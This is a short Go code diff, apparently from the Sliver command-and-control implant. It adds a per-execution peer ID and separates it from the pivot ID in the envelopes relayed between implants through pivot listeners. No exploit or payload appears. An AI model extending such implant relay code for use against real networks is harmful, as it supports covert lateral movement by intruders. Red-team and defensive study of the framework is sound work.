@@ -45,6 +45,8 @@ var (
 
 	pivotListeners = &sync.Map{}
 	listenerID     = uint32(0)
+
+	PeerID = PivotID() // This implant's Peer ID, a per-execution instance ID
 )
 
 // StartListener - Generic interface to a start listener function
@@ -233,9 +235,10 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 				// {{end}}
 				envelopeData, _ := proto.Marshal(envelope)
 				data, _ := proto.Marshal(&pb.PivotPeerEnvelope{
-					PeerID: p.ID(), // Our Peer ID
-					Name:   consts.SliverName,
-					Data:   envelopeData,
+					PeerID:  PeerID, // Our Peer ID
+					PivotID: p.ID(),
+					Name:    consts.SliverName,
+					Data:    envelopeData,
 				})
 				p.upstream <- &pb.Envelope{
 					ID:   0, // Pivot server implementation uses handlers, so ID must be zero
